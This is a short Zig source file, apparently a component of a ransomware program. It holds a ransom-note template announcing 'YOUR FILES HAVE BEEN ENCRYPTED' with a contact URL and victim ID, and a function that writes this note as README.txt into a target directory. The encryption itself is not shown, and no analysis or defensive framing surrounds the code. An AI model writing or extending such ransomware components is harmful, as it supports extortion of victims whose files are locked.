const std = @import("std");

const NOTE_TEMPLATE =
    \\
    \\🦖 YOUR FILES HAVE BEEN ENCRYPTED ! 🦖
    \\=======================================
    \\
    \\To restore them, visit our website:
    \\
    \\{s}
    \\
    \\Your ID: {d}
    \\
    \\
;

pub fn makeRansomNote(dir_path: []const u8, contact_url: []const u8, client_id: usize) !void {
    const allocator = std.heap.page_allocator;

    const ransom_note_path = try std.fs.path.join(
        allocator,
        &[_][]u8{ @constCast(dir_path), @constCast("README.txt") },
    );
    const file = try std.fs.cwd().createFile(ransom_note_path, .{});
    defer file.close();

    const note = try std.fmt.allocPrint(
        allocator,
        NOTE_TEMPLATE,
        .{ contact_url, client_id },
    );
    _ = try file.writeAll(note);
}
